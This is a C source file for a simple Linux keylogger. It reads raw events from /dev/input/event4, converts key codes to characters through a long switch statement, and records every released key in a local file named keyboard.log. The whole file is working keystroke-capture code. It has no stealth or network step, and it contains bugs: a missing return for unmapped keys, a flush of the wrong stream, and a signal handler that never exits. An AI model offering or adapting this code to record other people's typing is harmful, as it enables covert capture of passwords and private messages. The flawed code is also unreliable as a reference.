#include <stdio.h>
#include <linux/input.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

#define KEYBOARD "/dev/input/event4"
#define LOGPATH "keyboard.log"

int keyboard;
FILE *fp;

char convert_code_to_char(__u16);
void sigcatch(int);

int main(void)
{
    if ((keyboard = open(KEYBOARD, O_RDONLY)) == -1) {
        return 1;
    }
    if ((fp = fopen(LOGPATH, "w")) == NULL) {
        return 1;
    }

    signal(SIGINT, sigcatch);

    for (;;) {
        struct input_event event;

        if (read(keyboard, &event, sizeof(event)) != sizeof(event))
            return 1;

        switch (event.type) {
            case EV_KEY:
                if (event.value == 0) {
                    fprintf(fp, "%c", convert_code_to_char(event.code));
                }
                break;
            default:
                break;
        }
        fflush(stdout);
    }
    close(keyboard);
    fclose(fp);

    return 0;
}

char convert_code_to_char(__u16 code)
{
    switch (code) {
        case KEY_1:
            return '1';
            break;
        case KEY_2:
            return '2';
            break;
        case KEY_3:
            return '3';
            break;
        case KEY_4:
            return '4';
            break;
        case KEY_5:
            return '5';
            break;
        case KEY_6:
            return '6';
            break;
        case KEY_7:
            return '7';
            break;
        case KEY_8:
            return '8';
            break;
        case KEY_9:
            return '9';
            break;
        case KEY_0:
            return '0';
            break;
        case KEY_MINUS:
            return '-';
            break;
        case KEY_EQUAL:
            return '=';
            break;
        case KEY_Q:
            return 'q';
            break;
        case KEY_W:
            return 'w';
            break;
        case KEY_E:
            return 'e';
            break;
        case KEY_R:
            return 'r';
            break;
        case KEY_T:
            return 't';
            break;
        case KEY_Y:
            return 'y';
            break;
        case KEY_U:
            return 'u';
            break;
        case KEY_I:
            return 'i';
            break;
        case KEY_O:
            return 'o';
            break;
        case KEY_P:
            return 'p';
            break;
        case KEY_LEFTBRACE:
            return '[';
            break;
        case KEY_RIGHTBRACE:
            return ']';
            break;
        case KEY_ENTER:
            return '\n';
            break;
        case KEY_A:
            return 'a';
            break;
        case KEY_S:
            return 's';
            break;
        case KEY_D:
            return 'd';
            break;
        case KEY_F:
            return 'f';
            break;
        case KEY_G:
            return 'g';
            break;
        case KEY_H:
            return 'h';
            break;
        case KEY_J:
            return 'j';
            break;
        case KEY_K:
            return 'k';
            break;
        case KEY_L:
            return 'l';
            break;
        case KEY_SEMICOLON:
            return ';';
            break;
        case KEY_APOSTROPHE:
            return '\'';
            break;
        case KEY_GRAVE:
            return '`';
            break;
        case KEY_BACKSLASH:
            return '\\';
            break;
        case KEY_Z:
            return 'z';
            break;
        case KEY_X:
            return 'x';
            break;
        case KEY_C:
            return 'c';
            break;
        case KEY_V:
            return 'v';
            break;
        case KEY_B:
            return 'b';
            break;
        case KEY_N:
            return 'n';
            break;
        case KEY_M:
            return 'm';
            break;
        case KEY_COMMA:
            return ',';
            break;
        case KEY_DOT:
            return '.';
            break;
        case KEY_SLASH:
            return '/';
            break;
        case KEY_SPACE:
            return ' ';
            break;
        default:
            break;
    }
}

void sigcatch(int signal)
{
    close(keyboard);
    fclose(fp);
}

